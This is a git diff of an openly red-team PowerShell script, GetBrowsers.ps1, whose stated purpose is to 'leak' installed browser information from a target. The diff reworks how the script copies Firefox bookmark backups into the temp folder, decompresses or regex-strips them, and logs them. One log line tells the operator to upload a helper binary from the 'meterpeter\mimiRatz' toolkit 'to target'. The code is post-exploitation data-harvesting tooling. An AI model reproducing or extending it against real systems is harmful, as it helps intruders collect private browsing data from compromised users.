@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-  Standalone Powershell script to leak Installed browsers information.
+  Standalone Powershell Script to Leak Installed Browsers Information.
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: IE, Firefox, Chrome
@@ -15,7 +15,7 @@
 
 .NOTES
    PS C:\> Get-Help ./GetBrowsers.ps1 -full
-   Access This Cmdlet Comment_based_Help
+   Access This Cmdlet Comment_Based_Help
 
    mozlz4-win32.exe (Optional Dependencie)
    Used to convert firefox bookmarks files from: .jsonlz4 To: .json (More clean outputs)
@@ -460,8 +460,8 @@ function FIREFOX {
         }
     }
 
-    ## TODO: Retrieve FireFox bookmarks
-    # Need to test it on IEFP computer
+    ## Retrieve FireFox bookmarks
+    # TODO: Need to test it on IEFP computer
     echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "-----------------" >> $LogFilePath\BrowserEnum.log
     $IPATH = pwd;$AlternativeDir = $False
@@ -483,7 +483,6 @@ function FIREFOX {
             $Final = $parse[0]
             ## Copy .Jsonlz4 file to $env:tmp directory
             Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
-            $fail = $False;cd $env:tmp
         }else{
             ## Store 1º bookmark file into { $Final } local var
             cd "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\"
@@ -492,14 +491,21 @@ function FIREFOX {
             $Final = $parse[0]
             ## Copy .Jsonlz4 file to $env:tmp directory
             Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
-            $fail = $False;cd $env:tmp
         }
-
+    
         If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
-            $fail = $True
             echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
             echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
+            ## mozlz4-win32.exe Firefox Fail dependencie bypass
+            # TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
+            # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..  
+            $Json = Get-Content "$Bookmarks_Path" -Raw
+            $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
+                ForEach ($Key in $Regex){
+                    echo "`n" $Key >> $LogFilePath\BrowserEnum.log
+                }
         }else{
+            cd $env:tmp
             ## Convert from jsonlz4 to json
             .\mozlz4-win32.exe --extract output.jsonlz4 output.json
             $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
@@ -510,18 +516,6 @@ function FIREFOX {
             echo $ParsingData >> $LogFilePath\BrowserEnum.log
             Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
             Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
-        }
-
-        cd $IPATH
-        ## mozlz4-win32.exe , mozlz4-win64.exe Fail dependencie bypass
-        # TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
-        # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..
-        If($fail -eq $True){
-            $Json = Get-Content "$Bookmarks_Path" -Raw
-            $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
-                ForEach ($Key in $Regex){
-                    echo "`n" $Key >> $LogFilePath\BrowserEnum.log
-                }
         }
     }
     cd $IPATH
